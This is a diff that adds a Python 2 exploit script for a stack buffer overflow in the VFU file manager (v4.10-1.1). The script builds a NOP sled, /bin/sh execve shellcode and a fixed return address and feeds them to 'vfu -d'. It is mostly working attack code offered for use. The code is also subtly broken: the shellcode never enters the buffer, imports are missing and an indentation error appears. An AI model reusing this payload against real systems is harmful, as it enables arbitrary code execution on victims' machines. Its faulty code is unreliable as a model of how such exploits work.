@@ -1,0 +1,29 @@
+# Exploit Author: Juan Sacco - http://www.exploitpack.com
+<jsacco@exploitpack.com>
+# Tested on: GNU/Linux - Debian Wheezy
+# Description: VFU v4.10-1.1 is prone to a stack-based buffer overflow
+# vulnerability because the application fails to perform adequate
+# boundary-checks on user-supplied input.
+#
+# An attacker can exploit this issue to execute arbitrary code in the
+# context of the application. Failed exploit attempts will result in a
+# denial-of-service condition.
+#
+# Vendor homepage: VFU v4.10-1.1 ( Latest version ) -
+http://cade.datamax.bg/vfu/
+# Debian package: https://packages.debian.org/wheezy/vfu
+
+buffersize =  803
+nopsled = "\x90"
+shellcode = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+eip = "\x10\xf0\xff\xbf"
+buffer = nopsled * (buffersize-len(shellcode)) + eip
+
+try:
+   subprocess.call(["vfu -d", buffer])
+except OSError as e:
+   if e.errno == os.errno.ENOENT:
+       print "VFU not found!"
+   else:
+   print "Error executing exploit"
+   raise
